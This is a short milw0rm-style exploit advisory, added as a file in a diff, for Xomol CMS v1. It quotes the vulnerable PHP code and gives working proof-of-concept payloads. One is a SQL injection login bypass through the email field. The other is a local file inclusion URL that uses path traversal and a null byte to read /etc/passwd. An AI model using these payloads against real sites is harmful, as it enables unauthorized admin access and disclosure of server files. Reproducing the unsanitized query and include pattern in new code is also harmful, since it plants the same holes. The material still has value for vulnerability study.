@@ -1,0 +1,34 @@
+                     \#'#/
+                     (-.-)
+   -------------oOO---(_)---OOo------------
+   |    Xomol CMS v1 Login Bypass & LFI   |
+   |             coded by DNX             |
+   ----------------------------------------
+[!] Discovered.: DNX
+[!] Vendor.....: http://www.xomol.net
+[!] Detected...: 12.05.2008
+[!] Reported...: 13.05.2008 (didn't work: host mail.xomol.net said: 554 5.7.1 - Relay access denied)
+[!] Response...: xx.xx.2008
+
+[!] Background.: Xomol CMS is a content management system based on PHP and MySQL
+
+[!] Bug Bypass.: $_POST['email'] and $_POST['password'] in index.php near line 59
+
+                 58: if(!empty($_POST['email'])&&!empty($_POST['password'])){
+                 59:      $sql='SELECT user_id FROM users WHERE user_email="'.$_POST['email'].'"  AND  user_password="'.md5($_POST['password']).'" AND user_status=1';
+                 60:      $result = sql_query($sql, $dbi);
+
+[!] Bug LFI....: $op in index.php near line 272
+
+                 234: switch($op){
+
+                 270:     default:
+                 271:     if (file_exists('modules/'.$op.'/index.php')) {
+                 272:         include('modules/'.$op.'/index.php');
+
+[!] PoC Bypass.: Login with email: " OR user_group=1/*"" and password: not empty
+                 (works only with magic_quotes_gpc = off)
+
+[!] PoC LFI....: http://127.0.0.1/xomol/index.php?op=../../../../../../../../../../etc/passwd%00
+
+# milw0rm.com [2008-05-25]
